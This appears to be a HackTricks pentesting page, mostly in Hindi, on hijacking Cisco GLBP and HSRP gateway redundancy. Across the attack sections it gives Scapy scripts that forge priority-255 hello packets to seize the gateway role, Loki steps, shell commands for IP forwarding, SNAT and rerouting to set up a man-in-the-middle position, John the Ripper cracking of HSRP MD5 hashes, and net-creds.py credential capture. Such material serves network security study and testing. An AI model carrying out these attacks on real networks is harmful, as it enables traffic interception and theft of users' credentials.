# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### FHRP पर अंतर्दृष्टियाँ

FHRP को नेटवर्क की मजबूती देने के लिए डिज़ाइन किया गया है, जो कई राउटरों को एक वर्चुअल यूनिट में मिलाकर लोड वितरण और fault tolerance को बढ़ाता है। Cisco Systems ने इस सूट में प्रमुख प्रोटोकॉल पेश किए हैं, जैसे GLBP और HSRP।

### GLBP प्रोटोकॉल पर अंतर्दृष्टियाँ

Cisco द्वारा विकसित GLBP TCP/IP स्टैक पर काम करता है, और संचार के लिए UDP पोर्ट 3222 का उपयोग करता है। GLBP समूह के राउटर 3-सेकंड के अंतराल पर "hello" पैकेट बदलते हैं। यदि कोई राउटर 10 सेकंड तक ये पैकेट भेजने में विफल रहता है, तो उसे ऑफ़लाइन माना जाता है। हालांकि, ये टाइमर स्थिर नहीं हैं और इन्हें बदला जा सकता है।

GLBP for IPv6 UDP/3222 पर multicast FF02::66 का उपयोग करता है, और वर्चुअल MAC फॉर्मेट `0007.b4xx.xxyy` हो जाता है (AVF ID आखिरी बाइट में होता है)। Timing और attack surface IPv4 जैसा ही रहते हैं, इसलिए hijack techniques dual‑stack networks में भी काम करती हैं।

### GLBP ऑपरेशन और लोड वितरण

GLBP अलग दिखता है क्योंकि यह एक single virtual IP और कई virtual MAC addresses के साथ राउटरों में लोड वितरण सक्षम करता है। GLBP समूह में प्रत्येक राउटर packet forwarding में शामिल होता है। HSRP/VRRP के विपरीत, GLBP कई तंत्रों के माध्यम से वास्तविक load balancing प्रदान करता है:

- **Host-Dependent Load Balancing:** हॉस्ट को AVF MAC address का लगातार असाइनमेंट बनाए रखता है, जो स्थिर NAT कॉन्फ़िगरेशन के लिए आवश्यक है।
- **Round-Robin Load Balancing:** डिफ़ॉल्ट तरीका, अनुरोध करने वाले hosts के बीच AVF MAC address असाइनमेंट को बारी-बारी से बदलता है।
- **Weighted Round-Robin Load Balancing:** प्रीडिफाइंड "Weight" मेट्रिक्स के आधार पर लोड वितरित करता है।

### GLBP के प्रमुख घटक और शब्दावली

- **AVG (Active Virtual Gateway):** मुख्य राउटर, peer routers को MAC addresses आवंटित करने के लिए जिम्मेदार।
- **AVF (Active Virtual Forwarder):** नेटवर्क ट्रैफ़िक को प्रबंधित करने के लिए निर्दिष्ट राउटर।
- **GLBP Priority:** AVG निर्धारित करने वाला एक मीट्रिक, डिफ़ॉल्ट 100 से शुरू होकर 1 से 255 के बीच होता है।
- **GLBP Weight:** राउटर पर वर्तमान लोड को दर्शाता है, जिसे मैन्युअल रूप से या Object Tracking के माध्यम से समायोजित किया जा सकता है।
- **GLBP Virtual IP Address:** सभी जुड़े उपकरणों के लिए नेटवर्क का डिफ़ॉल्ट गेटवे के रूप में कार्य करता है।

इंटरैक्शन के लिए, GLBP रिज़र्व्ड multicast address 224.0.0.102 और UDP पोर्ट 3222 का उपयोग करता है। राउटर 3-सेकंड के अंतराल पर "hello" पैकेट भेजते हैं, और यदि किसी पैकेट के 10 सेकंड में मिस होने पर उन्हें नॉन-ऑपरेशनल माना जाता है।

### GLBP Attack Mechanism

एक हमलावर सर्वाधिक priority value (255) वाला GLBP packet भेजकर primary router बन सकता है। इससे DoS या MITM attacks हो सकते हैं, जो ट्रैफ़िक को इंटरसेप्ट या रीडायरेक्ट करने की अनुमति देते हैं।

**Practical GLBP hijack with Scapy (short PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
payload bytes तैयार करें ताकि वे GLBP हैडर की नकल करें (version/opcode/priority/weight/VRID)। frame को loop करने से यह सुनिश्चित होता है कि आप AVG election जीत जाएंगे यदि authentication अनुपस्थित है।

### Loki के साथ GLBP Attack निष्पादित करना

[Loki](https://github.com/raizo62/loki_on_kali) एक GLBP attack कर सकता है by injecting a packet with priority and weight set to 255। Pre-attack steps में ऐसी जानकारी इकट्ठा करना शामिल है जैसे virtual IP address, authentication की उपस्थिति, और router priority values — इसके लिए Wireshark जैसे tools का उपयोग करें।

Attack Steps:

1. Promiscuous mode पर स्विच करें और IP forwarding सक्षम करें।
2. Target router की पहचान करें और उसका IP प्राप्त करें।
3. एक Gratuitous ARP जेनरेट करें।
4. AVG के रूप में impersonate करते हुए एक malicious GLBP packet inject करें।
5. Attacker के नेटवर्क इंटरफ़ेस को GLBP virtual IP की नकल करते हुए एक secondary IP address असाइन करें।
6. पूरी ट्रैफ़िक visibility के लिए SNAT लागू करें।
7. Routing समायोजित करें ताकि इंटरनेट एक्सेस जारी रहे original AVG router के माध्यम से।

इन स्टेप्स का पालन करके attacker स्वयं को एक "man in the middle" के रूप में स्थापित कर लेता है, जो network traffic — जिसमें unencrypted या sensitive data शामिल है — को intercept और analyze करने में सक्षम होता है।

डेमो के लिए, यहाँ आवश्यक command snippets हैं:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic net-creds.py या समान tools का उपयोग करके किया जा सकता है ताकि समझौता किए गए नेटवर्क के माध्यम से बहने वाले डेटा को capture और analyze किया जा सके।

### Passive Explanation of HSRP Hijacking with Command Details

#### HSRP (Hot Standby Router/Redundancy Protocol) का अवलोकन

HSRP एक Cisco proprietary protocol है जो network gateway redundancy के लिए डिज़ाइन किया गया है। यह कई physical routers को एक साझा IP address वाले एक logical unit में configure करने की अनुमति देता है। इस logical unit का प्रबंधन एक primary router द्वारा किया जाता है जो traffic को निर्देशित करने के लिए जिम्मेदार होता है। GLBP, जो load balancing के लिए priority और weight जैसे metrics का उपयोग करता है, के विपरीत HSRP traffic management के लिए एक single active router पर निर्भर करता है।

HSRPv1 multicast **224.0.0.2** और virtual MAC `0000.0c07.acXX` का उपयोग करता है; HSRPv2 और HSRPv2 for IPv6 **224.0.0.102 / FF02::66** और virtual MAC `0000.0c9f.fXXX` का उपयोग करते हैं। UDP destination port IPv4 के लिए **1985** और IPv6 के लिए **2029** है।

#### HSRP में भूमिकाएँ और शब्दावली

- **HSRP Active Router**: वह डिवाइस जो gateway के रूप में कार्य करता है और traffic flow को manage करता है।
- **HSRP Standby Router**: एक backup router जो active router के fail होने पर takeover के लिए तैयार रहता है।
- **HSRP Group**: routers का एक सेट जो मिलकर एक resilient virtual router बनाते हैं।
- **HSRP MAC Address**: HSRP सेटअप में logical router को आवंटित किया गया virtual MAC address।
- **HSRP Virtual IP Address**: HSRP group का virtual IP address, जो connected devices के लिए default gateway के रूप में कार्य करता है।

#### HSRP Versions

HSRP दो संस्करणों में आता है, HSRPv1 और HSRPv2, जो मुख्य रूप से group capacity, multicast IP उपयोग, और virtual MAC address संरचना में भिन्न होते हैं। प्रोटोकॉल service information के आदान-प्रदान के लिए विशिष्ट multicast IP addresses का उपयोग करता है, और Hello packets हर 3 सेकंड में भेजे जाते हैं। यदि 10 सेकंड के भीतर कोई packet प्राप्त नहीं होता है तो एक router inactive माना जाता है।

#### HSRP Attack Mechanism

HSRP attacks में Active Router की भूमिका जबरदस्ती अपने कब्जे में लेने के लिए maximum priority value inject करना शामिल है। इससे Man-In-The-Middle (MITM) attack हो सकता है। pre-attack के आवश्यक कदमों में HSRP सेटअप के बारे में डेटा इकट्ठा करना शामिल है, जिसे traffic analysis के लिए Wireshark का उपयोग करके किया जा सकता है।

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
यदि authentication **नहीं** configured है, तो लगातार hellos higher priority के साथ भेजने से peers को *Speak*/*Listen* स्टेट्स में मजबूर किया जा सकता है और आपको *Active* बनने की अनुमति मिलती है, जिससे ट्रैफ़िक आपके होस्ट के माध्यम से redirect हो जाता है।

**HSRP प्रमाणीकरण के विशेष मामले**

- Legacy plain-text प्रमाणीकरण आसानी से स्पूफ किया जा सकता है।
- MD5 प्रमाणीकरण केवल HSRP payload को कवर करता है; crafted packets अभी भी control planes पर rate-limit/DoS कर सकते हैं। NX-OS रिलीज़ पहले प्रमाणीकृत समूहों के खिलाफ DoS की अनुमति देते थे (देखें Cisco advisory CSCup11309)।
- कई ISP / VPS shared VLANs पर, HSRPv1 multicasts tenants के लिए दिखाई देते हैं; बिना auth के आप जुड़कर और ट्रैफ़िक को preempt करके शामिल हो सकते हैं।

#### HSRP प्रमाणीकरण बाईपास करने के चरण

1. HSRP डेटा वाला नेटवर्क ट्रैफ़िक .pcap फाइल के रूप में सेव करें।
```shell
tcpdump -w hsrp_traffic.pcap
```
2. .pcap फाइल से MD5 hashes को hsrp2john.py का उपयोग करके निकालें।
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper का उपयोग करके MD5 hashes क्रैक करें।
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki के साथ HSRP Injection निष्पादित करना**

1. HSRP advertisements पहचानने के लिए Loki लॉन्च करें।
2. नेटवर्क इंटरफ़ेस को promiscuous mode पर सेट करें और IP forwarding सक्षम करें।
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. विशिष्ट router को लक्ष्य करने, क्रैक किया हुआ HSRP password इनपुट करने, और Active Router की नकल करने के लिए आवश्यक कॉन्फ़िगरेशन करने हेतु Loki का उपयोग करें।
4. Active Router रोल प्राप्त करने के बाद, वैध ट्रैफ़िक को intercept करने के लिए अपने नेटवर्क इंटरफ़ेस और IP tables कॉन्फ़िगर करें।
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. रूटिंग टेबल को संशोधित करें ताकि ट्रैफ़िक पूर्व Active Router के माध्यम से जाए।
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. intercepted ट्रैफ़िक से credentials कैप्चर करने के लिए net-creds.py या समान utility का उपयोग करें।
```shell
sudo python2 net-creds.py -i eth0
```

इन चरणों को निष्पादित करने से attacker को ट्रैफ़िक intercept और manipulate करने की स्थिति मिलती है, जो GLBP hijacking की प्रक्रिया के समान है। यह HSRP जैसे redundancy protocols में मौजूद कमजोरियों और मजबूत security measures की आवश्यकता को उजागर करता है।

## संदर्भ

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
